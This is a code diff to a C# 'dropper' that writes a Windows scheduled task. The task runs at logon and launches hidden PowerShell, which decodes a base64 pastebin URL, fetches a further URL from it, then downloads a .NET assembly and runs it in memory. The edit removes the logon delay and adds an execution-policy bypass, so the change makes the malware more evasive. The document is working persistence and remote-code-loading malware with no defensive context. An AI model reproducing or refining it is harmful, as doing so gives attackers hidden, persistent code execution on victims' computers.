@@ -25,7 +25,6 @@ namespace dropper
   <Triggers>
     <LogonTrigger>
       <Enabled>true</Enabled>
-      <Delay>PT5S</Delay>
     </LogonTrigger>
   </Triggers>
   <Principals>
@@ -56,7 +55,7 @@ namespace dropper
   <Actions Context=""Author"">
     <Exec>
       <Command>powershell.exe</Command>
-      <Arguments>-noprofile -windowstyle hidden -command [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData([System.Text.Encoding]::UTF8.GetString((New-Object System.Net.WebClient).DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0xMcXhXN01C')))))).EntryPoint.Invoke($null, (, [string[]] ('" + args[0] + @"', '" + args[1] + @"', '" + args[2] + @"')))</Arguments>
+      <Arguments>-noprofile -executionpolicy bypass -windowstyle hidden -command [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData([System.Text.Encoding]::UTF8.GetString((New-Object System.Net.WebClient).DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0xMcXhXN01C')))))).EntryPoint.Invoke($null, (, [string[]] ('" + args[0] + @"', '" + args[1] + @"', '" + args[2] + @"')))</Arguments>
     </Exec>
   </Actions>
 </Task>");
